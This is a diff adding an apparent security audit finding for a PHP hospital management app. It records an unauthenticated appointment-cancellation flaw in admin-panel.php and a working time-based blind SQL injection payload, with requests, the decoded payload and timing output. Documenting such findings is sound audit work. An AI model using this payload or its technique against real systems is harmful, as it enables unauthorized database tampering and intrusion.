@@ -1,0 +1,22 @@
+HMS-01: Unauthenticated UPDATE SQL injection + unauthorized appointment cancellation
+Sink: admin-panel.php:71  mysqli_query($con,"update appointmenttb set userStatus='0' where ID = '".$_GET['ID']."'")
+Auth gate: NONE (file reads $_SESSION without any isset/redirect check)
+
+[1] Unauthorized status change (no session, plain ID)
+    GET /admin-panel.php?cancel=1&ID=4            (no Cookie header)
+    HTTP 200
+    DB: SELECT ID,userStatus FROM appointmenttb WHERE ID=4
+      before: 4 | 1
+      after:  4 | 0        <- row modified by unauthenticated request
+
+[2] Time-based blind SQLi (12 seeded appointment rows)
+    baseline:  GET /admin-panel.php?cancel=1&ID=999
+               -> HTTP 200 in 0.110s
+    payload:   GET /admin-panel.php?cancel=1&ID=999%27%20OR%20%28SELECT%20858%29%3E%28SELECT%20SLEEP%281%29%29--%20-
+               (decodes to: 999' OR (SELECT 858)>(SELECT SLEEP(1))-- -)
+               -> HTTP 200 in 12.189s   (= 12 rows x SLEEP(1), per-row WHERE evaluation)
+    Delta: 0.11s vs 12.19s. UPDATE-context injection confirmed (audit's SLEEP(5) variant
+    works identically; SLEEP(1) used to keep 12-row multiplication cheap).
+
+[Worked payload note] OR-form evaluated per row; an AND-form with a false first operand
+never reaches SLEEP (AND short-circuit) - do not "simplify" the PoC to AND.
